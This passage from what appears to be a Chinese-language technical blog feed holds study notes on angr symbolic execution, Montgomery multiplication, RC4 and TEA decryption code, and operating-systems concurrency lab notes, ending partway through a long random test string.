<li><p><strong>符号化文件</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">filename = <span class="string">&quot;&quot;</span></span><br><span class="line">filesize = </span><br><span class="line"></span><br><span class="line">password = init_state.solver.BVS(<span class="string">&#x27;password&#x27;</span>,filesize*<span class="number">8</span>)</span><br><span class="line">sim_file = angr.storage.SimFile(filename,content=password,size=filesize)</span><br><span class="line"></span><br><span class="line">init_state.fs.insert(sim_file)</span><br></pre></td></tr></table></figure></p></li>
</ul>
<h3 id="探索阶段">2. 探索阶段</h3>
<ul>
<li><p><strong>探索指定地址并查看标准流</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sm.explore(find = addr_to_find)</span><br></pre></td></tr></table></figure></p></li>
<li><p><strong>利用函数explore分支</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">is_good</span>(<span class="params">state</span>):</span><br><span class="line">	<span class="keyword">return</span> <span class="string">b&quot;Good Job!&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_bad</span>(<span class="params">state</span>):</span><br><span class="line">	<span class="keyword">return</span> <span class="string">b&quot;Try Again!&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sm.explore(find=is_good, avoid=is_bad)</span><br><span class="line"><span class="comment"># sm.explore(find=addr_find, avoid=addr_avoid)</span></span><br></pre></td></tr></table></figure></p></li>
</ul>
<h3 id="输出阶段">3. 输出阶段</h3>
<ul>
<li><p><strong>查看结果</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> sm.found:</span><br><span class="line">	found_state = sm.found[<span class="number">0</span>]</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;[x] Solution: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(found_state.posix.dumps(<span class="number">0</span>)))</span><br></pre></td></tr></table></figure></p></li>
<li><p><strong>求解寄存器的符号向量</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">result = init_state.solver.<span class="built_in">eval</span>(BVS)</span><br></pre></td></tr></table></figure></p></li>
</ul>
]]></content>
      <categories>
        <category>Software analysis technology</category>
      </categories>
      <tags>
        <tag>SymbolicExecution</tag>
      </tags>
  </entry>
  <entry>
    <title>Math Knowledge Summary</title>
    <url>/posts/20963.html</url>
    <content><![CDATA[<blockquote class="blockquote-center">
总结一下计算机中的数学相关内容，便于后续调用
</blockquote>
<span id="more"></span>
<h1 id="目录">[0] 目录</h1>
<ol type="1">
<li><p><a href="">数学算法</a></p>
<ol type="1">
<li><p>[模乘]</p>
<ul>
<li>[1-1-1 蒙哥马利算法]</li>
</ul></li>
</ol></li>
<li><p><a href="">密码学</a></p>
<ol type="1">
<li><p><a href="#1-stream-cipher">Stream Cipher</a></p>
<ul>
<li><a href="#1-1-rc4">1-1 RC4</a></li>
</ul></li>
<li><p><a href="#2-block-cipher">Block Cipher</a></p>
<ul>
<li><a href="#2-1-teaxteaxxtea">2-1 tea/xtea/xxtea</a></li>
</ul></li>
</ol></li>
</ol>
<h1 id="math">[1] MATH</h1>
<h2 id="模乘">[1-1] 模乘</h2>
<h3 id="蒙哥马利算法">[1-1-1] 蒙哥马利算法</h3>
<p>蒙哥马利算法能够提高类似模幂运算的速度而实现的，主要是因为蒙哥马利算法巧妙地避免了大量模运算（除法），极大地降低了运算时间，下面介绍如何减少x*y
mod N的模运算数目。</p>
<p>首先，蒙哥马利算法引入了REDC函数，该函数以大数T，模数N，模数N的逆元的负数N'和整数R（如果N为素数，R一般选取<span
class="math inline">\(2^{n\_bit}\)</span>，这样就可以在整除前提下用移位运算代替除法运算，也就是将下面代码第三行的整除运算换成移位运算）作为输入，在不使用模运算的情况下输出<span
class="math inline">\(TR^{-1} mod
N\)</span>。该函数减少了模运算的数目，同时将T的蒙哥马利形式恢复成了普通形式。该函数的低效版python实现如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def REDC(R, N, N_inverse, T):</span><br><span class="line">    m = ((T % R) * N_inverse) % R</span><br><span class="line">    t = (T + m * N) // R</span><br><span class="line">    if t &gt;= N:</span><br><span class="line">        return t - N</span><br><span class="line">    return t</span><br></pre></td></tr></table></figure>
<p>可以看到m的预计算使得t处于(0,2N)之间，我们可以用一次比较和一次减法代替模运算。如果想要进一步提升效率，可以将m提出这个函数放入查找表中，进一步减少模运算的数目。</p>
<p>接下来介绍大数T的蒙哥马利形式：假设我们有模数N，大整数T。其实T的蒙哥马利形式<span
class="math inline">\(\overline{T}\)</span>就是TR.其中 R
，且R与模数N互素，这样我们可以通过REDC函数来恢复T mod N。</p>
<p>假设我们有模数N，大数a和大数b，蒙哥马利模乘就是：先将a和b转化为蒙哥马利形式，然后计算<span
class="math inline">\(\overline{a} * \overline{b}\)</span>，也就是<span
class="math inline">\(a*b*R^2\)</span>，最后求解<span
class="math inline">\(\overline{c} = REDC(\overline{a} *
\overline{b})\)</span>即可求得乘积c的蒙哥马利形式。我们可以将<span
class="math inline">\(\overline{c}\)</span>再丢进REDC函数即可获得c，也可以用<span
class="math inline">\(\overline{c}\)</span>进行之后的运算。</p>
<p>到目前为止，除了预计算m和求R的模逆元需要几次模运算外，所有运算均不涉及模运算，还保证了所有乘法运算都维持在modN的量级进行。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">extended_gcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> b, <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    gcd, x1, y1 = extended_gcd(b % a, a)</span><br><span class="line">    x = y1 - (b // a) * x1</span><br><span class="line">    y = x1</span><br><span class="line">    <span class="keyword">return</span> gcd, x, y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod_inverse</span>(<span class="params">a, m</span>):</span><br><span class="line">    gcd, x, y = extended_gcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> gcd != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Inverse doesn&#x27;t exist&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc_n_bit</span>(<span class="params">N</span>):</span><br><span class="line">    n_bit = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> N &gt; <span class="number">0</span>:</span><br><span class="line">        N &gt;&gt;= <span class="number">1</span></span><br><span class="line">        n_bit += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> n_bit</span><br><span class="line">        </span><br><span class="line"><span class="comment"># 找到满足 N*N_inverse = -1 modR 的 N_inverse</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_N_inverse</span>(<span class="params">N, R</span>):</span><br><span class="line">    N_inv =  mod_inverse(N, R)</span><br><span class="line">    N_inverse = (R - N_inv) % R</span><br><span class="line">    <span class="keyword">return</span> N_inverse</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 计算 TR^&#123;-1&#125; mod N，也就是把 T 的蒙哥马利形式转换回普通形式</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">REDC</span>(<span class="params">R, N, N_inverse, T</span>):</span><br><span class="line">    n_bit = calc_n_bit(N)</span><br><span class="line">    m = ((T % R) * N_inverse) % R</span><br><span class="line">    <span class="comment"># print(&quot;t:&quot; ,(T + m * N) / R)</span></span><br><span class="line">    t = (T + m * N) &gt;&gt; n_bit</span><br><span class="line">    <span class="keyword">if</span> t &gt;= N:</span><br><span class="line">        <span class="keyword">return</span> t - N</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 T 的普通形式转换为蒙哥马利形式</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert_to_montgomery</span>(<span class="params">R, N, T</span>):</span><br><span class="line">    <span class="keyword">return</span> (T * R) % N</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 T1 * T2 的蒙哥马利形式</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">montgomery_multiply</span>(<span class="params">T1, T2, N, R</span>):</span><br><span class="line">    product = T1 * T2</span><br><span class="line">    N_inv = find_N_inverse(N, R)</span><br><span class="line">    <span class="keyword">return</span> REDC(R, N, N_inv, product)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    N = <span class="number">2</span>**<span class="number">4096</span> - <span class="number">1</span></span><br><span class="line">    n_bit = calc_n_bit(N)</span><br><span class="line">    R = <span class="number">1</span> &lt;&lt; n_bit</span><br><span class="line">    T1 = <span class="number">231735531420147883</span></span><br><span class="line">    T2 = <span class="number">8270984215581679609</span></span><br><span class="line">    <span class="comment"># mont_T1 = T1 * R mod N</span></span><br><span class="line">    mont_T1 = convert_to_montgomery(R, N, T1)</span><br><span class="line">    <span class="comment"># mont_T2 = T2 * R mod N</span></span><br><span class="line">    mont_T2 = convert_to_montgomery(R, N, T2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;montgomery_multiply: &quot;</span>, REDC(R, N, find_N_inverse(N, R), montgomery_multiply(mont_T1, mont_T2, N, R)))</span><br></pre></td></tr></table></figure>
<h1 id="stream-cipher">[1] Stream Cipher</h1>
<h2 id="rc4">[1-1] RC4</h2>
<h3 id="基本原理">[1-1-1] 基本原理</h3>
<p>加密: 明文与 keystream 异或得到密文</p>
<p>密文: 密文与 keystream 异或得到明文</p>
<p>keystream 与明文等长</p>
<p>由于 RC4 采取逐位异或的加密方式，只要我们知道了密文和key，只需要放到
cyberchef 里再加密一次就能得到原文</p>
<h3 id="生成密钥流keystream">[1-1-2] 生成密钥流（keystream）</h3>
<p>RC4 的密钥流生成由两部分组成：</p>
<ol type="1">
<li><p>KSA（the Key-Scheduling Algorithm）</p></li>
<li><p>PRGA（the Pseudo-Random Generation Algorithm）</p></li>
</ol>
<p><strong>KSA: 利用key生成S盒</strong> <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> T[SBOX_LEN] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; SBOX_LEN; i++) &#123;</span><br><span class="line">    Sbox[i] = i;</span><br><span class="line">    T[i] = key[ i % key_length ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; SBOX_LEN; i++) &#123;</span><br><span class="line">    j = (j + Sbox[i] + T[i]) % SBOX_LEN;</span><br><span class="line">    swap(&amp;Sbox[i], &amp;Sbox[j]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>PRGA: 利用S盒生成密钥流</strong> <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; data_len; k++) &#123;</span><br><span class="line">    i = (i + <span class="number">1</span>) % SBOX_LEN;</span><br><span class="line">    j = (j + Sbox[i]) % SBOX_LEN;</span><br><span class="line">    swap(&amp;Sbox[i], &amp;Sbox[j]);</span><br><span class="line">    t = (Sbox[i] + Sbox[j]) % SBOX_LEN;</span><br><span class="line">    puc_key_stream[k] = Sbox[t];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="完整代码">[1-1-3] 完整代码</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SBOX_LEN 256</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rc4_encrypt rc4_crypt</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rc4_decrypt rc4_crypt</span></span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">swap_uchar</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *puc_x, <span class="type">unsigned</span> <span class="type">char</span> *puc_y)</span></span><br><span class="line">&#123;</span><br><span class="line">    *puc_x = *puc_x ^ *puc_y;</span><br><span class="line">    *puc_y = *puc_x ^ *puc_y;</span><br><span class="line">    *puc_x = *puc_x ^ *puc_y;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexdump</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *puc_data, <span class="type">int</span> length)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, puc_data[i]);</span><br><span class="line">        <span class="keyword">if</span> (i &amp;&amp; (i + <span class="number">1</span>) % <span class="number">16</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 利用Key生成S盒</span></span><br><span class="line"><span class="comment"> * the Key-Scheduling Algorithm</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">rc4_ksa</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *puc_sbox, <span class="type">unsigned</span> <span class="type">char</span> *puc_key, <span class="type">int</span> key_length)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> tmp[SBOX_LEN] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; SBOX_LEN; i++) &#123;</span><br><span class="line">        puc_sbox[i] = i;</span><br><span class="line">        tmp[i] = puc_key[i % key_length];</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; SBOX_LEN; i++) &#123;</span><br><span class="line">        j = (j + puc_sbox[i] + tmp[i]) % SBOX_LEN;</span><br><span class="line">        swap_uchar(&amp;puc_sbox[i], &amp;puc_sbox[j]); <span class="comment">//交换puc_sbox[i]和puc_sbox[j]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 利用S盒生成密钥流</span></span><br><span class="line"><span class="comment"> * The pseudo-random generation algorithm(PRGA)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">rc4_prga</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *puc_sbox, <span class="type">unsigned</span> <span class="type">char</span> *puc_key_stream, <span class="type">unsigned</span> <span class="type">long</span> ul_data_length)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> k = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; ul_data_length; k++) &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % SBOX_LEN;</span><br><span class="line">        j = (j + puc_sbox[i]) % SBOX_LEN;</span><br><span class="line">        swap_uchar(&amp;puc_sbox[i], &amp;puc_sbox[j]);</span><br><span class="line">        t = (puc_sbox[i] + puc_sbox[j]) % SBOX_LEN;</span><br><span class="line">        <span class="comment">/* 为了更清晰理解rc4算法流程，此处保存keystream，不直接进行XOR运算 */</span></span><br><span class="line">        puc_key_stream[k] = puc_sbox[t];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* 加解密 */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_crypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *puc_data, <span class="type">unsigned</span> <span class="type">char</span> *puc_key_stream, <span class="type">unsigned</span> <span class="type">long</span> ul_data_length)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> i = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 把PRGA算法放在加解密函数中可以不需要保存keystream */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ul_data_length; i++) &#123;</span><br><span class="line">        puc_data[i] ^= puc_key_stream[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> sbox[SBOX_LEN] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> key[SBOX_LEN] = &#123;<span class="string">&quot;HeyGap&quot;</span>&#125;; <span class="comment">//秘钥内容随便定义</span></span><br><span class="line">    <span class="type">char</span> data[<span class="number">512</span>] = <span class="string">&quot;HeyGap&quot;</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> puc_keystream[<span class="number">512</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ul_data_length = <span class="built_in">strlen</span>(data);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;key=%s, length=%d\n\n&quot;</span>, key, <span class="built_in">strlen</span>(key));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Raw data string:%s\n&quot;</span>, data);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Raw data hex:\n&quot;</span>);</span><br><span class="line">    hexdump(data, ul_data_length);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 生成S-box */</span></span><br><span class="line">    rc4_ksa(sbox, (<span class="type">unsigned</span> <span class="type">char</span> *)key, <span class="built_in">strlen</span>(key));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 生成keystream并保存,S-box也会被更改 */</span></span><br><span class="line">    rc4_prga(sbox, puc_keystream, ul_data_length);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;S-box final status:\n&quot;</span>);</span><br><span class="line">    hexdump(sbox, <span class="keyword">sizeof</span>(sbox));</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;key stream:\n&quot;</span>);</span><br><span class="line">    hexdump(puc_keystream, ul_data_length);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 加密 */</span></span><br><span class="line">    rc4_encrypt((<span class="type">unsigned</span> <span class="type">char</span>*)data, puc_keystream, ul_data_length);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cipher hexdump:\n&quot;</span>);</span><br><span class="line">    hexdump(data, ul_data_length);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 解密 */</span></span><br><span class="line">    rc4_decrypt((<span class="type">unsigned</span> <span class="type">char</span>*)data, puc_keystream, ul_data_length);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;decypt data:%s\n&quot;</span>, data);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="block-cipher">[2] Block Cipher</h1>
<h2 id="teaxteaxxtea">[2-1] Tea/xTea/xxTea</h2>
<h3 id="tea-decrypt">[2-1-1] Tea decrypt</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">uint32_t</span> key[<span class="number">4</span>] = &#123;<span class="number">1234</span>,<span class="number">2341</span>,<span class="number">3412</span>,<span class="number">4123</span>&#125;;</span><br><span class="line"><span class="type">uint32_t</span> delta = <span class="number">0xDEADBEEF</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tea_decrypt</span><span class="params">(<span class="type">uint32_t</span> *encrypted)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">uint32_t</span> enc_tmp1 = encrypted[<span class="number">0</span>],enc_tmp2 = encrypted[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++) &#123;</span><br><span class="line">        sum += delta;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++) &#123;</span><br><span class="line">        enc_tmp2 -= (sum + enc_tmp1) ^ (<span class="number">16</span> * enc_tmp1 + key[<span class="number">2</span>]) ^ (<span class="number">32</span> * enc_tmp1 + key[<span class="number">3</span>]);</span><br><span class="line">        enc_tmp1 -= (sum + enc_tmp2) ^ (<span class="number">16</span> * enc_tmp2 + key[<span class="number">0</span>]) ^ (<span class="number">32</span> * enc_tmp2 + key[<span class="number">1</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line">    encrypted[<span class="number">0</span>] = enc_tmp1;</span><br><span class="line">    encrypted[<span class="number">1</span>] = enc_tmp2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> encflag[] = &#123;</span><br><span class="line">        <span class="number">0</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">tea_decrypt</span>((<span class="type">uint32_t</span> *)encflag+<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">tea_decrypt</span>((<span class="type">uint32_t</span> *)encflag+<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">tea_decrypt</span>((<span class="type">uint32_t</span> *)encflag+<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">tea_decrypt</span>((<span class="type">uint32_t</span> *)encflag+<span class="number">6</span>);</span><br><span class="line">    cout&lt;&lt;(<span class="type">char</span> *)encflag&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="xtea-decrypt">[2-1-2] xTea decrypt</h3>
<h3 id="xxtea-decrypt">[2-1-3] xxTea decrypt</h3>
]]></content>
      <categories>
        <category>CS Basics</category>
      </categories>
      <tags>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>CSBasics - NJUOS_Note</title>
    <url>/posts/64267.html</url>
    <content><![CDATA[<blockquote class="blockquote-center">
记录一下上课+做实验时产生的问题、思考与收获
</blockquote>
<span id="more"></span>
<h1 id="m2-plcs">[M2] plcs</h1>
<ul>
<li>做完这个实验，收获概括来讲是
<ol type="1">
<li>理解计算图与依赖关系，并通过它来实现并发</li>
<li>LCS的各种<a
href="https://www.geeksforgeeks.org/longest-common-subsequence-dp-4/">实现方法</a></li>
<li>加深对互斥与同步的理解，写出第一个并发程序</li>
<li>加深对条件变量实现生产者消费者模型的理解</li>
<li>提高编程素养
<ol type="1">
<li>利用宏定义增强代码可读性</li>
<li>利用 assert 进行防御性编程</li>
<li>将大任务拆分成多个小任务</li>
</ol></li>
</ol></li>
</ul>
<h2 id="m2-1-并发编程">[M2-1] 并发编程</h2>
<ol type="1">
<li><p>任何可能被多线程修改的全局变量，都应该上锁以后再处理</p></li>
<li><p>生产者负责生产而不是消费，逻辑要对</p></li>
<li><p>在现实生活中找一些实例来帮助理解并发程序</p></li>
<li><p>并发函数 <figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">pthread_mutex_lock/pthread_mutex_unlock</span><br><span class="line"><span class="comment">// 我认为这两个函数之间的代码被称作“临界区”</span></span><br><span class="line"><span class="comment">// 上锁或解锁时暂停时间，但临界区还是会被interrupt</span></span><br><span class="line"><span class="comment">// 用锁保护临界区的全局变量</span></span><br><span class="line"></span><br><span class="line">pthread_cond_wait</span><br><span class="line"><span class="comment">// 睡眠自己并释放持有的锁</span></span><br></pre></td></tr></table></figure></p></li>
</ol>
<h2 id="m2-2-实验数据">[M2-2] 实验数据</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">测试用例：</span><br><span class="line">dwiufhkdscnhuifhkwufherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbqkwdbeqpdwdinjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwhfbhjwdbqkwdbeqpdwdinjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbwdinjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhbwjhefwhjedbjasbwdinjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwhfbhjwdbqkwdbeqpdwdinjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvew